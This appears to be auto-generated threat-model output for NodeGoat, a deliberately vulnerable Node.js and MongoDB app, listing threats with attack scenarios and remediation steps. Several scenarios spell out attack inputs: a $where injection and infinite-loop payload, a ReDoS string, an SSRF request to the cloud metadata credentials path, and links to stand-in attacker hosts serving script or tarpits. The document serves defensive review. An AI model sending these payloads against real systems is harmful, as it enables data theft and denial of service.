threats.attackScenario: An attacker requests GET /allocations/<id>?threshold=1'; return 1 == '1 so that app/data/allocations-dao.js:78 interpolates it into `{$where: "this.userId == N && this.stocks > '<threshold>'"}`, causing the mongod server to evaluate attacker JavaScript that returns every allocations document, and a payload such as `0';while(true){}'` pins the database CPU and stalls all queries.
threats.impactReason: Injected JavaScript runs inside mongod, allowing arbitrary predicate evaluation over collections and an infinite loop that denies the database to every user.
threats.likelihoodReason: The threshold field is a free-text input on the allocations page (app/views/allocations.html:22) with validation explicitly commented out and the exploit strings written in the source comments.

mitigation.summary: Remove the $where clause and validate the threshold as an integer.
steps: Replace the $where construction in app/data/allocations-dao.js:77-79 with the query-operator form `{userId: parsedUserId, stocks: {$gt: parsedThreshold}}`.
Parse threshold with parseInt and reject values outside 0-99 before querying, as the commented fix at lines 70-75 describes.
Restore the numeric input with min/max in app/views/allocations.html:21.

threats.title: User passwords stored in plaintext in the MongoDB users collection
threats.asset: plaintext user passwords in the users collection
threats.attackScenario: app/data/user-dao.js:61 compares the submitted password to the stored one with `fromDB === fromUser`, so the users collection holds passwords in clear text; an attacker who reaches mongod on port 27017 (or who reads documents via the $where injection in allocations-dao.js) dumps users.password and immediately signs in as any account, including isAdmin users, and reuses the credentials elsewhere.
assumptions: Assume MongoDB authentication is not enabled and the app connects with full, unrestricted access as shown in docker-compose.yml.
threats.impactReason: Every account's password is recoverable verbatim along with SSN and bank details in the same collection, enabling full account takeover and credential stuffing.
threats.likelihoodReason: Any read access to the users collection, whether by injection or by direct connection to the database, yields usable credentials with no cracking step. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Hash passwords with bcrypt on registration and verify with bcrypt.compare.
steps: In app/data/user-dao.js, hash the password with bcrypt before usersCol.insert in this.addUser.
Replace the `fromDB === fromUser` comparison at app/data/user-dao.js:61 with bcrypt.compare as the commented fix at lines 62-66 shows.
Migrate existing documents by forcing a password reset for all users.

threats.title: Vulnerable mongodb 2.2.36 driver exposes the database connection to denial of service
threats.asset: availability of the nodegoat MongoDB connection serving users, allocations, contributions and memos
threats.attackScenario: The application connects with mongodb@2.2.36 (package.json:18), which carries GHSA-mh5c-679w-hh4r; an attacker who can influence driver input or BSON parsing on the MongoClient connection created at server.js:30 triggers the denial-of-service condition, leaving every route that reads a collection (dashboard, allocations, memos) failing for all users.
threats.impactReason: All data access flows through the single MongoClient connection, so loss of the driver stops the whole application.
threats.likelihoodReason: The advisory is public and the pinned version is far behind the fixed 3.1.13 release, though exploitation requires reaching the affected driver code path.

mitigation.summary: Upgrade the MongoDB driver past the fixed release.
steps: Raise mongodb in package.json from 2.2.36 to a supported 3.x/4.x release and adapt the callback-style DAO calls (insert/update) to the newer API.
Re-run the DAOs in app/data against the upgraded driver and confirm MongoClient.connect in server.js:30 still returns a usable db handle.

threats.title: MongoDB wire traffic carrying SSN and passwords is unauthenticated and unencrypted between the app and the mongo container
threats.asset: SSN, bank account and routing numbers, and plaintext user passwords in transit to the users collection
threats.attackScenario: The connection string used by server.js is mongodb://mongo:27017/nodegoat (docker-compose.yml:8) with no credentials and no tls option, so an attacker with a foothold on the container network sniffs or MITMs the profile-to-mongo wire protocol traffic to read the ssn, dob and bankAcc values written by ProfileDAO.updateUser, or connects directly to port 27017 impersonating the application and rewrites the users collection.
assumptions: An attacker can reach the container network segment between the web and mongo services.
Assume MongoDB authentication is not enabled and the app connects with full, unrestricted access as shown in docker-compose.yml.
The deployed MongoDB URI has no credentials and no TLS parameters, matching the value set in docker-compose.yml.
threats.impactReason: The flow carries every sensitive field in the application, including plaintext passwords stored by UserDAO.addUser.
threats.likelihoodReason: Requires network access to the internal docker network or a co-located container rather than remote unauthenticated reach. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection.
steps: Create a least-privilege MongoDB user and set MONGODB_URI in docker-compose.yml to include credentials and tls=true.
Pass TLS options (tls, tlsCAFile) to MongoClient.connect in server.js:30.
Bind the mongo service to the internal network only and remove the expose directive if the application is the sole client.

threats.title: Profile update accepts cross-site forged POSTs, letting an attacker overwrite a victim's SSN and bank details
threats.asset: stored profile records: SSN, date of birth, bank account and routing numbers
threats.attackScenario: With no CSRF token on the state-changing POST /profile handler (app/routes/index.js:48), an attacker hosts a page that auto-submits a form to http://<host>/profile with bankAcc and bankRouting set to the attacker's account and '123456#'; a logged-in victim who visits it has the values written to their users document by ProfileDAO.updateUser, because the session cookie has no SameSite restriction.
assumptions: The session cookie is sent on cross-site POST requests because no SameSite attribute is configured.
threats.impactReason: An attacker silently rewrites the victim's banking and identity fields, which downstream benefit/allocation flows rely on.
threats.likelihoodReason: Only requires luring an authenticated user to a page; no token or unpredictable value protects the form.

mitigation.summary: Add CSRF tokens to all state-changing forms and restrict the session cookie.
steps: Re-enable the csurf middleware and res.locals.csrftoken block commented out at server.js:104-113 and emit the token as a hidden field in app/views/profile.html.
Set cookie: { httpOnly: true, secure: true, sameSite: 'strict' } on the express-session configuration at server.js:78.

threats.title: Database seeding job may repopulate the users collection over live profile data
threats.asset: stored user profiles in the nodegoat users collection
threats.attackScenario: The web service start command in docker-compose.yml:9 runs `node artifacts/db-reset.js` before `npm start`, so any restart or redeploy of the container re-runs the seeder against the same mongo://mongo:27017/nodegoat database and wipes or overwrites the profile documents that ProfileDAO.updateUser has written, destroying real SSN and bank records and handing an attacker known default credentials.
assumptions: The same docker-compose start command is used in the deployed environment rather than a production-specific entrypoint.
threats.impactReason: A restart destroys live profile data and reintroduces seeded accounts with predictable logins.
threats.likelihoodReason: Depends on whether this compose entrypoint is used outside development; container restarts are otherwise routine.

mitigation.summary: Keep the database reset out of the application start path.
steps: Remove `node artifacts/db-reset.js` from the web service command in docker-compose.yml:9 and run it as an explicit one-off development task.
Guard artifacts/db-reset.js to abort unless NODE_ENV is development.

threats.title: Profile pages render without a Content-Security-Policy, so injected markup in profile fields runs unconstrained
threats.asset: the victim's authenticated profile data (SSN, DOB, bank details) rendered by GET /profile
threats.attackScenario: No helmet or security-header middleware is registered (package.json:13), so the response from GET /profile at app/routes/index.js:47 carries no Content-Security-Policy or X-Frame-Options; an attacker who stores markup in a profile field, or who frames /profile on their own page, can execute script or clickjack the victim into submitting the profile form, and the script then reads the rendered ssn/dob/bankAcc values and posts them off-origin.
assumptions: The profile template renders at least one user-controlled field in a context where injected markup is not neutralised.
threats.impactReason: Absence of CSP and frame protection removes the last defence around a page that displays SSN and bank account numbers.
threats.likelihoodReason: Any visitor can frame the page; injection into profile fields requires the victim to view attacker-influenced content.

mitigation.summary: Register helmet with a restrictive CSP and frame protection on the Express app.
steps: Uncomment and enable the helmet block at server.js:38-65, including helmet.contentSecurityPolicy(), helmet.frameguard() and helmet.hsts().
Call app.disable('x-powered-by') so the Express version is not advertised.
Add helmet to the dependency list in package.json.

threats.title: SSN, date of birth and bank details are written to the users collection in cleartext
threats.asset: users' SSN, date of birth, bank account and routing numbers
threats.attackScenario: ProfileDAO.updateUser at app/data/profile-dao.js:42 stores ssn, dob, bankAcc and bankRouting straight onto the users document with the encrypt/decrypt helpers left commented out at app/data/profile-dao.js:15-40, so anyone who reaches the mongo service (exposed on port 27017 in docker-compose.yml without authentication credentials) or obtains a database dump reads every user's SSN and bank account number as plain text.
assumptions: Assume MongoDB authentication is not enabled and the app connects with full, unrestricted access as shown in docker-compose.yml.
The MongoDB deployment described by docker-compose.yml runs without authentication or field-level encryption, so any reader of the users collection sees the stored values.
threats.impactReason: Full SSN, DOB and bank account/routing numbers for every registered user are directly usable for identity theft and financial fraud.
threats.likelihoodReason: Requires reaching the database or a backup, but the compose file places Mongo alongside the app with no credential configuration visible. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Encrypt sensitive profile fields before they are persisted and decrypt on read.
steps: Re-enable the crypto helpers at app/data/profile-dao.js:15-40 using crypto.createCipheriv with a per-record random IV stored alongside the ciphertext, and a key sourced from an environment variable rather than config/env/all.js.
Apply encrypt() to ssn, dob, bankAcc and bankRouting in updateUser and decrypt() in getByUserId (app/data/profile-dao.js:94).
Enable MongoDB authentication and TLS for the connection string used in server.js so the wire protocol traffic to the mongo container is not readable.

threats.title: Profile changes to SSN and bank details are written with no audit record of who changed them
threats.asset: accountability for changes to users' bank account and SSN fields
threats.attackScenario: handleProfileUpdate at app/routes/profile.js:40 takes userId from req.session and calls ProfileDAO.updateUser, which $sets the new bankAcc/bankRouting over the previous values with no timestamp, actor or prior-value log, so an attacker who rides a session (for example via the unprotected POST /profile) redirects a victim's payroll to their own account and the victim cannot show when or from where the change was made.
assumptions: No audit or change log is written elsewhere for profile updates.
threats.impactReason: Fraudulent bank-detail changes cannot be attributed or reconstructed, blocking incident response and dispute resolution.
threats.likelihoodReason: Every profile update takes this path; the gap is realised whenever any abuse of the route occurs.

mitigation.summary: Write an append-only audit entry for every profile field change.
steps: In ProfileDAO.updateUser (app/data/profile-dao.js:42), insert a record into an audit collection containing userId, changed field names, timestamp and the request source IP before applying the $set.
Pass req.ip and req.session.userId from app/routes/profile.js:82 into updateUser so the audit entry names the acting session.

threats.title: ReDoS on POST /profile via bankRouting stalls the single-threaded event loop
threats.asset: availability of the NodeGoat application (all user sessions and profile data access)
threats.attackScenario: An authenticated user submits POST /profile with bankRouting set to a long run of digits followed by a non-'#' character (e.g. '11111111111111111111111111111111!'), which the nested-quantifier regex /([0-9]+)+\#/ at app/routes/profile.js:59 backtracks over exponentially, pinning the Node event loop so every other request to the Express server hangs.
threats.impactReason: A single request can block the whole single-process Express server, denying service to every user of the application.
threats.likelihoodReason: The route is a normal profile-update form reachable by any logged-in user and the payload is a trivial string; no special position is needed.

mitigation.summary: Remove the outer quantifier from the bankRouting validation regex and bound input length.
steps: Replace `/([0-9]+)+\#/` at app/routes/profile.js:59 with `/^[0-9]+#$/`, which matches the same intended format without catastrophic backtracking.
Reject bankRouting values longer than a fixed maximum (e.g. 32 characters) before running the regex in handleProfileUpdate.

threats.title: Outbound research fetch runs over plaintext HTTP to an attacker-selectable host
threats.asset: fetched remote page content shown to the user
threats.attackScenario: Since req.query.url at app/routes/research.js:15 accepts any scheme, an attacker or a network position between the server and the upstream supplies url=http://finance.example/quote/ and a man-in-the-middle substitutes the quote body, which the handler writes unmodified into the user's page at line 25 as if it came from the application.
assumptions: The deployment does not force all outbound needle requests through TLS.
threats.impactReason: The user is shown financial content that an on-path attacker fully controls, attributed to the application's own origin.
threats.likelihoodReason: Requires either an attacker-supplied http URL, which the route accepts, or a network position on the upstream path.

mitigation.summary: Force HTTPS to a fixed upstream host with certificate validation.
steps: Hardcode an https:// base URL in app/routes/research.js instead of reading req.query.url.
Ensure needle is called with rejectUnauthorized true so TLS certificates are verified.

threats.title: Server-side request forgery through the url parameter of GET /research
threats.asset: outbound request capability from the server network position and internal-only HTTP content
threats.attackScenario: app/routes/research.js:15 builds the outbound URL as req.query.url + req.query.symbol with no host allow-list, so an attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=  and the server fetches the cloud metadata endpoint and writes the response body straight back at line 25.
threats.impactReason: The attacker reaches internal services and metadata endpoints from inside the server's network position and reads their full response body.
threats.likelihoodReason: A single GET request with two query parameters, no authentication step shown in the handler, is enough.

mitigation.summary: Fix the outbound host in code and pass only an encoded symbol.
steps: Remove req.query.url from app/routes/research.js:15 and hardcode the quote provider base URL.
Validate req.query.symbol against /^[A-Za-z.-]{1,10}$/ and encodeURIComponent it before appending.
If arbitrary hosts are genuinely needed, resolve the hostname and reject private, loopback and link-local addresses before calling needle.get.

threats.title: Missing security response headers let the echoed /research body run without any CSP restraint
threats.asset: the victim's authenticated session with the application
threats.attackScenario: No Content-Security-Policy, X-Frame-Options or X-Content-Type-Options is emitted by the Express app, so the attacker-controlled HTML written by app/routes/research.js at line 25 executes inline script and loads attacker scripts with nothing to block it, and /research can also be framed to clickjack the logged-in victim.
assumptions: No reverse proxy in front of the Express app injects security headers.
threats.impactReason: Absent headers remove the defence-in-depth layer that would otherwise blunt injected script on the /research response.
threats.likelihoodReason: The /research route is reachable by any visitor following a crafted link.

mitigation.summary: Add helmet with a restrictive content security policy.
steps: Uncomment and enable helmet in server.js and add helmet.contentSecurityPolicy with a default-src 'self' policy.
Enable helmet.frameguard and the nosniff middleware already referenced in server.js.

threats.title: Remote page content echoed unescaped into the /research response enables stored-source HTML/script injection
threats.asset: the victim's authenticated session with the application (same-origin actions)
threats.attackScenario: Because app/routes/research.js:15 lets the attacker choose the host, the attacker sends a victim a link to GET /research?url=https://attacker.example/payload.html&symbol= ; the handler writes the attacker-controlled body verbatim with Content-Type text/html at lines 18-25, so the attacker's script executes on the application's origin and issues same-origin requests such as POST /login or profile updates as the logged-in victim.
assumptions: The application serves /research on the same origin as its authenticated pages.
threats.impactReason: Script runs on the application origin and can act as the victim, reading pages and submitting state-changing forms in their session; the session cookie itself is HttpOnly so it is not readable by the script.
threats.likelihoodReason: Only a crafted link and an attacker-hosted page are needed; no authentication is required to trigger the fetch.

mitigation.summary: Never echo fetched remote bodies into the response as HTML.
steps: Parse the fetched quote data in app/routes/research.js and render only extracted fields through the swig template with autoescaping enabled.
If raw passthrough is required, set Content-Type to text/plain and escape the body before res.write at line 25.

threats.title: No record of who triggered which outbound fetch from /research
threats.asset: audit trail of server-initiated outbound requests
threats.attackScenario: An attacker uses GET /research?url=http://10.0.0.5:8080/&symbol= to probe internal hosts; app/routes/research.js logs nothing about the requested URL or the calling session, so responders cannot attribute the internal scan traffic to a user or reconstruct which internal endpoints were reached.
assumptions: No access log capturing the full query string and session identity is retained for the Express server.
threats.impactReason: Incident response cannot attribute SSRF probing to an actor or enumerate what was accessed.
threats.likelihoodReason: Any exercise of the SSRF route goes unlogged by default.

mitigation.summary: Log the resolved outbound URL and the session identity for every /research fetch.
steps: Before needle.get in app/routes/research.js:16, log the session id and the final URL to the application logger.
Ship those logs to a retained store so outbound-request history can be reviewed.

threats.title: Attacker-controlled upstream host can stall or flood the /research handler
threats.asset: availability of the Express server process and its outbound connections
threats.attackScenario: An attacker repeatedly calls GET /research?url=http://attacker.example/slow&symbol= pointing at a host that trickles bytes or streams gigabytes; needle.get at app/routes/research.js:16 is called with no timeout or response size limit, so outstanding sockets and buffered response bodies accumulate until the Node process is exhausted.
assumptions: No rate limiting or request timeout is applied in front of the Express server.
threats.impactReason: The single-process Express server becomes unresponsive for all users while sockets and buffers are held.
threats.likelihoodReason: Trivial to script against an unauthenticated GET route, but requires sustained traffic from the attacker.

mitigation.summary: Bound the outbound request and the volume of traffic to /research.
steps: Pass open_timeout, read_timeout and response_timeout options to needle.get in app/routes/research.js:16.
Cap the accepted response size and reject bodies over a fixed limit before res.write.
Apply a per-IP rate limit to the /research route.

threats.title: Credentials travel to MongoDB in cleartext over the unauthenticated wire protocol
threats.asset: plaintext user passwords, SSN and bank details stored in the nodegoat users collection
threats.attackScenario: The session-to-mongo flow carries `usersCol.findOne({userName})` results containing the plaintext `password` field (app/data/user-dao.js:91-93, compared with === at line 61) over a connection built from `mongodb://mongo:27017/nodegoat` (docker-compose.yml:8, config/env/all.js:3) that carries no credentials and no tls option, so an attacker with access to the Docker bridge network sniffs the wire protocol responses to read every user's password, SSN and bank routing number, or connects to mongo:27017 directly and writes isAdmin:true onto their own user document.
assumptions: An attacker can reach the container network segment carrying port 27017.
Assume MongoDB authentication is not enabled and the app connects with full, unrestricted access as shown in docker-compose.yml.
The MongoDB instance is started without authentication and without TLS, as the credential-free connection string implies.
threats.impactReason: The flow exposes plaintext passwords plus SSN and bank details for every user, and unauthenticated write access permits privilege escalation to admin.
threats.likelihoodReason: Requires a foothold on the container or host network; port 27017 is only exposed internally by docker-compose.yml, not published. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection and stop sending plaintext passwords over it.
steps: Set MONGODB_URI in docker-compose.yml to include a dedicated least-privilege user, password and `?tls=true&authSource=admin`, and start the mongo service with --auth --tlsMode requireTLS.
Store only bcrypt hashes in the users collection so the flow no longer carries recoverable passwords (app/data/user-dao.js:25).
Apply field-level encryption for ssn, bankAcc and bankRouting using the crypto helpers sketched in app/data/profile-dao.js:15-40.

threats.title: Login error messages distinguish unknown username from wrong password, enabling account enumeration
threats.asset: valid usernames of registered accounts
threats.attackScenario: handleLoginRequest at app/routes/session.js:82-92 renders `Invalid username` when UserDAO.validateLogin returns err.noSuchUser but a different message when err.invalidPassword is set, so an attacker POSTs candidate usernames to /login and keeps the ones that return the password-specific message, building a list of real accounts to target with password guessing.
assumptions: The two distinct rendered error strings are returned to unauthenticated clients without any additional normalisation.
threats.impactReason: Only usernames leak, but they are the prerequisite for targeted credential attacks against the plaintext-password login.
threats.likelihoodReason: POST /login is unauthenticated and the distinction is trivially observable in the rendered page.

mitigation.summary: Return one identical error for both unknown-user and wrong-password outcomes.
steps: In app/routes/session.js handleLoginRequest, use the existing `errorMessage` constant ("Invalid username and/or password") in both the noSuchUser and invalidPassword branches.
Keep response timing similar by running the password comparison against a dummy hash when the user does not exist.

threats.title: Plaintext password storage and === comparison in login lets a database reader authenticate as any user
threats.asset: user credentials (plaintext passwords of all accounts)
threats.attackScenario: UserDAO.addUser stores the signup `password` field verbatim in the users collection (app/data/user-dao.js:25) and validateLogin compares it with `fromDB === fromUser` at app/data/user-dao.js:61, so an attacker who obtains a single dump of the nodegoat `users` collection (or any read access through another injection) reads every account's password directly and replays it at POST /login to take over the admin account.
threats.impactReason: Every user's password is recoverable with no cracking effort, including admin accounts, and users commonly reuse passwords elsewhere.
threats.likelihoodReason: The weakness is certain from the code; exploitation needs read access to the users collection or any data-exposure bug, and passwords are also exposed to anyone who can read the documents via the app.

mitigation.summary: Hash passwords with bcrypt on signup and verify with bcrypt.compare on login.
steps: In app/data/user-dao.js addUser, replace `password` with `bcrypt.hashSync(password, bcrypt.genSaltSync())` (the commented-out code at lines 26-30).
In app/data/user-dao.js validateLogin, replace `fromDB === fromUser` at line 61 with `bcrypt.compareSync(fromUser, fromDB)`.
Write a one-off migration that re-hashes or invalidates existing plaintext passwords and forces a reset.

threats.title: Session fixation: login does not regenerate the session id before setting req.session.userId
threats.asset: session identifiers and the authenticated user session
threats.attackScenario: express-session is configured with saveUninitialized:true at server.js:78-102 and SessionHandler sets req.session.userId on successful login without calling req.session.regenerate(), so an attacker first visits the site to obtain a connect.sid value, plants it in the victim's browser (the cookie has no Secure or SameSite attribute), waits for the victim to log in at POST /login, and then reuses the same session id to act as that user on /dashboard and admin pages guarded only by req.session.userId.
assumptions: No session.regenerate call exists in the part of handleLoginRequest not shown in the excerpt.
threats.impactReason: A fixed session yields full account takeover, including the admin flag checked by isAdminUserMiddleware.
threats.likelihoodReason: Requires planting a cookie in the victim's browser, which is eased by the plain-HTTP server and cookie flags left at library defaults.

mitigation.summary: Regenerate the session on successful authentication and harden the session cookie.
steps: In app/routes/session.js handleLoginRequest, wrap the assignment of req.session.userId in req.session.regenerate(() => { ... }).
Set saveUninitialized:false and cookie: { httpOnly: true, secure: true, sameSite: 'lax' } in the session() options at server.js:78.

threats.title: No authentication or audit trail on login attempts makes credential-stuffing against /login unattributable
threats.asset: authentication audit trail for user accounts
threats.attackScenario: handleLoginRequest only writes `console.log("Error: attempt to login with invalid user: ", userName)` at app/routes/session.js:64 for unknown users and logs nothing at all for successful logins or wrong-password attempts, so an attacker who guesses a password at POST /login leaves no record tying the session to an IP or timestamp, and the victim cannot later prove which transfers on their pension allocations were not theirs.
assumptions: Successful authentications are not logged anywhere else in the application or in a fronting proxy.
threats.impactReason: Account-takeover activity on financial records cannot be reconstructed or attributed after the fact.
threats.likelihoodReason: Any unauthenticated attacker can exercise /login repeatedly; the absence of records is inherent to every attempt.

mitigation.summary: Emit structured, sanitised authentication audit events for success and failure.
steps: In app/routes/session.js handleLoginRequest, log userName (CRLF-stripped as the comments at lines 78-80 describe), source IP, outcome and timestamp to a durable logger for both success and failure branches.
Forward those events to a central log store outside the application host so they cannot be edited from the web tier.

threats.title: Unauthenticated MongoDB endpoint can be flooded or dropped, halting all authentication
threats.asset: availability of login and every DAO-backed page
threats.attackScenario: Every login on the session-to-mongo flow issues an unindexed-by-default `findOne({userName})` against the users collection (app/data/user-dao.js:91-93) on a connection opened once at server.js:30 with no pool limits or credentials, so an attacker who reaches mongo:27017 on the compose network runs expensive queries or drops the `users` collection outright, and MongoClient.connect having already succeeded means the app keeps serving 500s while nobody can log in.
assumptions: Assume MongoDB authentication is not enabled and the app connects with full, unrestricted access as shown in docker-compose.yml.
MongoDB accepts connections from the container network without authentication.
No replica set or backup restores the users collection automatically.
threats.impactReason: Loss or overload of the users collection stops all authentication and all benefits, allocations and memo pages.
threats.likelihoodReason: The MongoDB port is only expose'd inside the compose network, so an attacker needs an existing foothold on that network. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Authenticate MongoDB, index the login lookup and constrain the driver pool.
steps: Enable --auth on the mongo service in docker-compose.yml and give the web service a role limited to the nodegoat database.
Create a unique index on users.userName so validateLogin's findOne cannot be turned into a collection scan.
Pass maxPoolSize and serverSelectionTimeoutMS to MongoClient.connect in server.js:30 and handle connection loss without exiting.

threats.title: Authorization decisions rest solely on an unsigned-scope session flag with no re-verification of admin status per request path
threats.asset: admin flag and admin-only functionality (benefits start dates for all users)
threats.attackScenario: isLoggedInMiddleware at app/routes/session.js:36-42 admits any request that merely carries req.session.userId, and isAdminUserMiddleware re-reads the user via getUserById where _id comes from parseInt of the session value, so an attacker who obtains or fixes a session id (the cookie is sent over plain HTTP by http.createServer at server.js:145) keeps that access indefinitely because logout only destroys the server-side record on GET /logout and no expiry or absolute session lifetime is configured.
assumptions: No maxAge or absolute session expiry is configured for express-session, so a captured session id stays valid until the store is cleared.
threats.impactReason: A long-lived session reaching isAdminUserMiddleware grants administrative control over benefit records for all users.
threats.likelihoodReason: Session ids travel over cleartext HTTP on port 4000, so any network-position attacker can capture and reuse one.

mitigation.summary: Bind sessions to a short expiry and serve them only over TLS.
steps: Add cookie: { maxAge: 900000, httpOnly: true, secure: true, sameSite: 'lax' } to the session() options in server.js:78 and set an absolute re-authentication deadline.
Switch server.js to the https.createServer block already present at lines 149-155 and redirect HTTP to HTTPS.

threats.title: Remote page content from an attacker-chosen host is written unsanitised into the /research response
threats.asset: the victim's authenticated NodeGoat session context in the browser
threats.attackScenario: Because app/routes/research.js:15 accepts the host from req.query.url and line 25 writes the fetched body verbatim with Content-Type text/html, an attacker sends a victim a link to /research?url=https://evil.example/&symbol=x so that attacker-authored HTML and script execute on the application's own origin and issue same-origin requests (such as profile or allocations updates) as the logged-in victim.
assumptions: Responses from the third-party endpoint are trusted and never sanitised or sandboxed before being written into the /research response.
threats.impactReason: Script runs on the application origin in the victim's session, allowing same-origin state-changing requests and reading pages the victim can see; the session cookie itself is HttpOnly so it is not readable by the script.
threats.likelihoodReason: Only a crafted link is needed, and the remote content is returned to the browser with no filtering.

mitigation.summary: Do not relay third-party response bodies into the application origin.
steps: Parse the fetched body server-side and render only the extracted quote fields through the Swig template instead of res.write(body) at app/routes/research.js:25.
If raw content must be shown, serve it with Content-Type text/plain or from a separate sandboxed origin.
Re-enable autoescape in swig.setDefaults in server.js so rendered values are escaped.

threats.title: Slow or oversized attacker-chosen upstream stalls /research request handlers
threats.asset: availability of the NodeGoat web server
threats.attackScenario: An attacker points the url parameter at a host they control that never finishes responding, calling GET /research?url=http://attacker.tarpit/&symbol=x repeatedly, and because needle.get at app/routes/research.js:16 is invoked with no timeout or response size limit, each request holds an open socket and buffers the body until the process exhausts sockets or memory.
assumptions: No proxy or platform-level request timeout terminates the outbound needle request.
threats.impactReason: Sustained requests exhaust outbound sockets and heap on the single Node process, degrading the whole application.
threats.likelihoodReason: Trivial to trigger from an unauthenticated crafted URL, though it needs sustained volume to matter.

mitigation.summary: Bound outbound fetches with timeouts and size limits.
steps: Pass open_timeout, read_timeout and response_timeout options to needle.get in app/routes/research.js:16.
Cap the accepted response length and abort the stream past the cap.
